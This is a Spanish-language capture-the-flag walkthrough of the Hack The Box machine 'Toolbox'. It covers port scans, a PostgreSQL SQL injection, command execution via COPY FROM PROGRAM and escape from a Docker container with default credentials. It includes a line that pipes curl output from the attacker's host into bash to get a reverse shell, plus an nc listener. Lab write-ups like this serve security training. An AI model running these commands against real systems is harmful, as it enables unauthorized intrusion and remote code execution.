---
title: "Toolbox"
description: "Toolbox"
pubDate: 2025-05-20
---

https://app.hackthebox.com/machines/Toolbox
\#win

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.10.236
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016190058.png)

## Reconocimiento de servicios

````
nmap -sCV -p21,22,135,139,443,445,5985,49665 10.10.10.236
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016190334.png)
Es windows
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016191219.png)

## Fuzz

Hay un archivo de docker en FTP
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016191800.png)
También Hay en el certificado SSL de la web un nombre de pagina, lo metemos en hosts
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016192338.png)
Tenemos un login
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016192610.png)

# Fase de ataque

## SQLI

Lanzamos una comilla simple
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016192733.png)
Nos da un error extraño y sabemos que es postgress
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016192758.png)
Con Burpsuite probamos si es vulnerable a SQLI

````
select pg_sleep(10);-- -
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016193735.png)
Si tarda 10 sec, es vulnerable.

### RCE 9.3

Creamos una tabla para ejecución de comandos

````
CREATE TABLE cmd_exec(cmd_output text);
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016194336.png)
Insertamos comandos para reverse shell

````
COPY cmd_exec FROM PROGRAM 'curl 10.10.14.16/shell.html|bash';
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016195804.png)
Creamos el archivo
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016195450.png)
Nos ponemos en escucha

````
nc -nlvp 443
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016195906.png)
\[-\]==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

Ajustar proporciones

````
stty rows 44 columns 184
````

# Privilege Escalation

## Salir de Docker

Probamos las contraseña por defualt de docker-toolbox (docke : tcpuser)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016201903.png)
Dentro de este sistema esta montado una estructura de windows en el directorio c/
Encontramos una clave privada de ssh.
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016202325.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016202850.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241016202903.png)
\[+\] ==pwned!==
